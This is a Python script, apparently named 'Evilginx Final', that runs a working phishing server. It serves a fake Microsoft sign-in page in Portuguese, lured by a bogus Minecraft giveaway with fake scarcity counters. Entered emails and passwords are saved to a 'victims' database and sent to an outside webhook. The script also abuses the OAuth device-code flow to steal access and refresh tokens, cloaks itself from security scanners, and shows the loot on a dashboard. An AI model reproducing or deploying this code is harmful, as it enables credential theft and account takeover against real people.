#!/usr/bin/env python3
"""
EVILGINX FINAL - VERSÃO CORRIGIDA (SEM "mee", COM CAPTURA DE TOKENS)
"""

import secrets
import json
import datetime
import random
import time
import requests
import os
import sqlite3
import re
import threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import deque

PORT = int(os.environ.get("PORT", 8080))
PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"

# Estado thread-safe
captured_sessions = deque(maxlen=100)
captured_lock = threading.Lock()
click_stats = {}
click_lock = threading.Lock()
counter = 0
counter_lock = threading.Lock()

def get_sid():
    global counter
    with counter_lock:
        counter += 1
        return f"SID_{counter}_{secrets.token_hex(8)}"

# Banco de dados
def init_db():
    with sqlite3.connect('captured.db') as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, email TEXT, password TEXT, ip TEXT,
            user_agent TEXT, click_count INTEGER
        )''')
init_db()

def save_db(data):
    with sqlite3.connect('captured.db') as conn:
        conn.execute('INSERT INTO victims (timestamp, email, password, ip, user_agent, click_count) VALUES (?,?,?,?,?,?)',
                     (data['timestamp'], data['email'], data['password'], data['ip'], data['user_agent'], data.get('click_count',0)))
        conn.commit()

# Webhook
def send_webhook(email, password, ip):
    if not WEBHOOK_URL:
        return
    try:
        requests.post(WEBHOOK_URL, json={"embeds":[{
            "title": "🎯 NOVA CONTA CAPTURADA!",
            "color": 0xff0000,
            "fields": [
                {"name":"📧 Email","value":email,"inline":True},
                {"name":"🔑 Senha","value":f"||{password}||","inline":True},
                {"name":"🌐 IP","value":ip,"inline":True}
            ]
        }]}, timeout=5)
    except: pass

# Device Code (tokens)
def start_device_flow():
    try:
        r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                         data={"client_id": DEVICE_CLIENT_ID, "scope": "https://graph.microsoft.com/.default offline_access"},
                         timeout=10)
        if r.status_code == 200:
            j = r.json()
            return j.get("user_code"), j.get("device_code"), j.get("verification_uri")
    except: pass
    return None, None, None

def poll_for_token(device_code):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    for _ in range(60):
        try:
            r = requests.post(url, data={
                "client_id": DEVICE_CLIENT_ID,
                "device_code": device_code,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
            }, timeout=5)
            if r.status_code == 200:
                j = r.json()
                return j.get("access_token",""), j.get("refresh_token","")
        except: pass
        time.sleep(5)
    return "", ""

# Validação
def is_valid_email(email):
    return bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email))

def sanitize(text):
    if not text: return ""
    return text.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")

def escape_js(text):
    return json.dumps(str(text)) if text else '""'

def is_bot(headers):
    ua = headers.get('User-Agent','').lower()
    bots = ['googlebot','bingbot','ahrefsbot','semrushbot','virustotal','phishtank','urlscan']
    return any(b in ua for b in bots)

# Handler
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass

    def _send(self, status, ct, body):
        self.send_response(status)
        self.send_header('Content-type', ct)
        self.end_headers()
        self.wfile.write(body if isinstance(body, bytes) else body.encode())

    def do_GET(self):
        path = urlparse(self.path).path
        if is_bot(self.headers):
            self._send(200, "text/html", b"Microsoft 365")
            return
        if path == '/':
            self._login()
        elif path == '/dashboard':
            self._dashboard()
        elif path == '/qrcode':
            self._qrcode()
        elif path == '/device/poll':
            self._poll()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        if path == '/auth':
            self._auth()
        elif path == '/api/click':
            with click_lock:
                click_stats[self.client_address[0]] = click_stats.get(self.client_address[0], 0) + 1
            self._send(200, "application/json", json.dumps({"status":"ok"}))
        else:
            self.send_response(404)
            self.end_headers()

    def _poll(self):
        q = parse_qs(urlparse(self.path).query)
        dc = q.get('device_code', [None])[0]
        if not dc:
            self._send(400, "application/json", json.dumps({"error":"missing"}))
            return
        acc, ref = poll_for_token(dc)
        self._send(200, "application/json", json.dumps({"access_token":acc, "refresh_token":ref}))

    def _qrcode(self):
        ucode, dcode, vuri = start_device_flow()
        url_js = escape_js(vuri if dcode else PUBLIC_URL)
        dev_js = escape_js(dcode) if dcode else '""'
        manual = f'<p><strong>Código manual:</strong> <code>{sanitize(ucode)}</code></p>' if ucode else ''
        html = f'''<!DOCTYPE html>
<html><head><title>QR Code - Tokens Microsoft</title>
<style>body{{background:#1a1a2e;color:white;text-align:center;padding:20px;}}</style></head>
<body>
<h1>📱 Escaneie para autorizar sua conta</h1>
{manual}
<div id="qrcode" style="background:white;padding:20px;display:inline-block;border-radius:10px;"></div>
<br><button onclick="poll()" style="background:#0067b8;color:white;border:none;padding:10px 20px;cursor:pointer;">🔍 Obter Token</button>
<div id="result"></div>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<script>
var qrUrl = {url_js};
var devCode = {dev_js};
new QRCode(document.getElementById("qrcode"), {{text:qrUrl, width:250, height:250}});
async function poll() {{
    if(!devCode) {{ document.getElementById('result').innerHTML = 'Falha'; return; }}
    document.getElementById('result').innerHTML = '⏳ Aguardando...';
    var r = await fetch('/device/poll?device_code=' + encodeURIComponent(devCode));
    var d = await r.json();
    if(d.access_token) {{
        document.getElementById('result').innerHTML = '✅ Access Token obtido!<br>✅ Refresh Token obtido!';
    }} else {{
        document.getElementById('result').innerHTML = '⏳ Autorize no celular e clique novamente.';
    }}
}}
</script>
<a href="/">Voltar</a>
</body></html>'''
        self._send(200, "text/html", html)

    def _login(self):
        sid = get_sid()
        og = random.choice(["KILL", "HERO", "GOLD", "STAR", "MOON", "FIRE", "SNOW", "LIFE"])
        html = f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na sua conta - Microsoft</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{font-family:'Segoe UI',sans-serif;background:#f1f1f1;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
        .container{{max-width:440px;width:100%}}
        .event-banner{{background:linear-gradient(135deg,#ffd700,#ffb347);border-radius:12px;padding:18px;margin-bottom:20px;text-align:center;color:#1a1a2e}}
        .event-title{{font-size:20px;font-weight:bold}}
        .event-skin{{font-size:24px;font-weight:bold;color:#e94560;margin:5px 0}}
        .scarcity-box{{background:#fff3cd;border-left:4px solid #ff9800;border-radius:8px;padding:12px;margin-bottom:15px;font-size:13px}}
        .scarcity-row{{display:flex;justify-content:space-between;margin:5px 0}}
        .login-card{{background:white;border-radius:4px;padding:44px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}}
        .microsoft-logo svg{{width:108px;height:23px;margin-bottom:28px}}
        h1{{font-size:24px;font-weight:600;margin-bottom:16px}}
        .input-field{{width:100%;padding:12px;font-size:15px;border:1px solid #8a8a8a;border-radius:2px;margin-bottom:20px}}
        .input-field:focus{{border-color:#0067b8;outline:none}}
        .sign-in-btn{{width:100%;background:#0067b8;color:white;border:none;padding:10px;font-size:15px;font-weight:600;cursor:pointer;border-radius:2px}}
        .sign-in-btn:hover{{background:#004c8f}}
        .links{{margin-top:24px}}
        .links a{{color:#0067b8;text-decoration:none;font-size:13px;margin-right:20px}}
        .footer{{margin-top:32px;font-size:11px;color:#666;text-align:center}}
        .step-2{{display:none}}
        .user-badge{{display:flex;align-items:center;gap:12px;background:#f5f5f5;padding:12px;border-radius:4px;margin-bottom:20px}}
        .error-message{{color:#d13438;font-size:12px;margin-bottom:10px;display:none}}
        .social-proof{{margin-top:20px;font-size:12px;color:#666;text-align:center;border-top:1px solid #eee;padding-top:15px}}
        .live-counter{{animation:pulse 1.5s infinite;font-weight:bold;color:#e94560}}
        @keyframes pulse{{0%{{opacity:1}}50%{{opacity:0.6}}100%{{opacity:1}}}}
        .timer{{font-family:monospace;font-size:16px;font-weight:bold;color:#d13438}}
    </style>
</head>
<body>
<div class="container">
    <div class="event-banner">
        <div class="event-title">🎉 EVENTO ESPECIAL MINECRAFT 2026 🎉</div>
        <div class="event-skin">🔥 ENDER PHOENIX 🔥</div>
        <div class="event-giveaway">🏆 SORTEIO DE CONTA RARA!<br>Conta com nome <strong style="font-size:18px">{og}</strong> (4 letras) - Valor R$500+</div>
    </div>
    <div class="scarcity-box">
        <div class="scarcity-row"><span>🎁 Skins disponíveis:</span><span id="skinsLeft">47</span></div>
        <div class="scarcity-row"><span>👥 Participantes:</span><span id="participants">15247</span></div>
        <div class="scarcity-row"><span>⏰ Expira em:</span><span class="timer" id="timer">14:59</span></div>
        <div class="scarcity-row"><span>👀 Online agora:</span><span class="live-counter" id="onlineCount">89</span></div>
    </div>
    <div class="login-card">
        <div class="microsoft-logo"><svg viewBox="0 0 108 23"><rect x="2" y="2" width="8" height="8" fill="#F25022"/><rect x="12" y="2" width="8" height="8" fill="#7FBA00"/><rect x="2" y="12" width="8" height="8" fill="#00A4EF"/><rect x="12" y="12" width="8" height="8" fill="#FFB900"/><path d="M32 18V4H35.5L41 13.2L46.5 4H50V18H46.5V9.4L41 18.6L35.5 9.4V18H32Z" fill="#1E1E1E"/><path d="M58 18V4H68V7.2H61.5V9.8H67V13H61.5V14.8H68V18H58Z" fill="#1E1E1E"/><path d="M74 18V4H84V7.2H77.5V9.8H83V13H77.5V14.8H84V18H74Z" fill="#1E1E1E"/><path d="M90 18V4H100V7.2H93.5V9.8H99V13H93.5V14.8H100V18H90Z" fill="#1E1E1E"/></svg></div>
        <div id="step1"><h1>Entrar</h1><form id="emailForm"><input type="email" id="email" class="input-field" placeholder="Email, telefone ou Skype" autofocus><div id="emailError" class="error-message"></div><button type="submit" class="sign-in-btn">Avançar</button></form></div>
        <div id="step2" class="step-2"><div class="user-badge"><div>👤</div><div><span id="userEmailDisplay"></span><br><a href="#" onclick="resetToStep1();return false;">Alterar conta</a></div></div><h1>Inserir senha</h1><form id="passwordForm"><div style="position:relative;"><input type="password" id="password" class="input-field" placeholder="Senha"><button type="button" onclick="togglePassword()" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;">👁️</button></div><div id="passwordError" class="error-message"></div><button type="submit" class="sign-in-btn">Entrar</button></form></div>
        <div class="links"><a href="#">Criar uma conta!</a><a href="#">Esqueceu sua senha?</a></div>
        <div class="footer"><a href="#">Termos de uso</a> | <a href="#">Política de Privacidade</a></div>
        <div class="social-proof">🔒 Verificação de segurança ativa | 🌍 +12 servidores integrados</div>
    </div>
</div>
<script>
var capturedEmail='',sessionId='{sid}',pageStart=Date.now(),clicks=0;
var skins=47,parts=15247,online=89,timerSec=900;
function track(){clicks++;fetch('/api/click',{method:'POST'});}
document.addEventListener('click',track);
setInterval(function(){if(skins>0){skins-=Math.floor(Math.random()*2)+1;document.getElementById('skinsLeft').innerHTML=Math.max(0,skins);}parts+=Math.floor(Math.random()*3)+1;document.getElementById('participants').innerHTML=parts.toLocaleString();online+=Math.floor(Math.random()*5)-2;online=Math.min(300,Math.max(25,online));document.getElementById('onlineCount').innerHTML=online;if(timerSec>0){timerSec--;var m=Math.floor(timerSec/60),s=timerSec%60;document.getElementById('timer').innerHTML=(m<10?'0'+m:m)+':'+(s<10?'0'+s:s);}},3000);
function togglePassword(){var p=document.getElementById('password');p.type=p.type==='password'?'text':'password';}
function resetToStep1(){document.getElementById('step1').style.display='block';document.getElementById('step2').style.display='none';document.getElementById('email').value='';document.getElementById('password').value='';}
document.getElementById('emailForm').addEventListener('submit',function(e){e.preventDefault();var email=document.getElementById('email').value,err=document.getElementById('emailError');if(!email||email.indexOf('@')===-1){err.textContent='Digite um email válido';err.style.display='block';return;}err.style.display='none';capturedEmail=email;document.getElementById('userEmailDisplay').textContent=email;document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';document.getElementById('password').focus();});
document.getElementById('passwordForm').addEventListener('submit',function(e){e.preventDefault();var pwd=document.getElementById('password').value,err=document.getElementById('passwordError');if(!pwd){err.textContent='Digite sua senha';err.style.display='block';return;}err.style.display='none';var timeOnPage=Math.floor((Date.now()-pageStart)/1000);fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:capturedEmail,password:pwd,session_id:sessionId,user_agent:navigator.userAgent,time_on_page:timeOnPage,click_count:clicks})}).then(function(){window.location.href='https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13';});});
</script>
</body></html>'''
        self._send(200, "text/html", html)

    def _auth(self):
        length = int(self.headers.get('Content-Length',0))
        try:
            data = json.loads(self.rfile.read(length).decode())
        except:
            self._send(400, "text/plain", "Bad JSON")
            return
        email = data.get('email','').strip()
        pwd = data.get('password','').strip()
        ua = data.get('user_agent','')[:200]
        clicks = data.get('click_count',0)
        ip = self.client_address[0]
        if not is_valid_email(email) or not pwd:
            self._send(400, "text/plain", "Invalid")
            return
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with captured_lock:
            captured_sessions.append({"timestamp":ts, "email":email, "password":pwd, "ip":ip, "ua":ua, "clicks":clicks})
        save_db({'timestamp':ts, 'email':email, 'password':pwd, 'ip':ip, 'user_agent':ua, 'click_count':clicks})
        send_webhook(email, pwd, ip)
        print(f"\n[{ts}] CAPTURADA: {email} | {pwd} | IP:{ip}")
        self._send(200, "application/json", json.dumps({"status":"ok"}))

    def _dashboard(self):
        with captured_lock:
            copy = list(captured_sessions)
        rows = ""
        for c in copy:
            rows += f'<tr>\n<td>{sanitize(c["timestamp"])}</td>\n<td>{sanitize(c["email"])}</td>\n<td>{sanitize(c["password"])}</td>\n<td>{sanitize(c["ip"])}</td>\n<td>{c.get("clicks",0)}</td>\n</tr>'
        total_clicks = sum(click_stats.values())
        html = f'''<!DOCTYPE html>
<html><head><title>Dashboard</title><style>body{{background:#0f0f1a;color:#cdd6f4;font-family:monospace;padding:20px;}}table{{width:100%;background:#1e1e2e;border-collapse:collapse;}}th,td{{padding:10px;border-bottom:1px solid #313244;}}th{{background:#313244;}}</style></head>
<body><h1>Dashboard - Evilginx</h1><p>Total capturas: {len(copy)} | Total cliques: {total_clicks}</p>
<table><thead><tr><th>Data</th><th>Email</th><th>Senha</th><th>IP</th><th>Cliques</th></tr></thead><tbody>{rows}</tbody></table>
<br><a href="/">Voltar</a> | <a href="/qrcode">QR Code</a></body></html>'''
        self._send(200, "text/html", html)

def run():
    print("="*60)
    print("🎯 EVILGINX FINAL - CORRIGIDO")
    print(f"📡 {PUBLIC_URL}")
    print("="*60)
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    server.serve_forever()

if __name__ == "__main__":
    run()
